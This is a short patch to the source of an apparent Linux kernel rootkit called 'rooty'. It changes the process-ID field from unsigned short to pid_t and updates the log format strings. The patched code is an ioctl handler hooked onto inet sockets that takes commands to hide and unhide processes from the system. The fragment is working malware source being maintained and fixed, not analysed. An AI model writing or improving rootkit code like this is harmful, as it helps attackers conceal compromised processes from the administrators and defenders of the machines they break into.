@@ -11,7 +11,7 @@ struct s_args
 
 struct s_proc_args
 {
-    unsigned short pid;
+    pid_t pid;
 };
 
 struct s_file_args
@@ -61,7 +61,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
             ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
             if ( ret )
                 return 0;
-            printk("rooty: IOCTL->Hiding PID %hu\n", proc_args.pid);
+            printk("rooty: IOCTL->Hiding PID %d\n", proc_args.pid);
             hide_proc(proc_args.pid);
         }
         break;
@@ -72,7 +72,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
             ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
             if ( ret )
                 return 0;
-            printk("rooty: IOCTL->Unhiding PID %hu\n", proc_args.pid);
+            printk("rooty: IOCTL->Unhiding PID %d\n", proc_args.pid);
             unhide_proc(proc_args.pid);
         }
         break;
